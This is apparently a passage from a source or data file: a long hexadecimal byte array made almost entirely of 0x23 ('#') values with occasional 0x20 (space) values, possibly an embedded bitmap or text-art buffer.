  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x20, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x20, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x20, 0x20, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x20, 0x20, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x20, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x20, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x20, 0x20, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x20, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x20, 0x20, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x20, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x20, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x20, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x20, 0x20, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x20, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x20, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
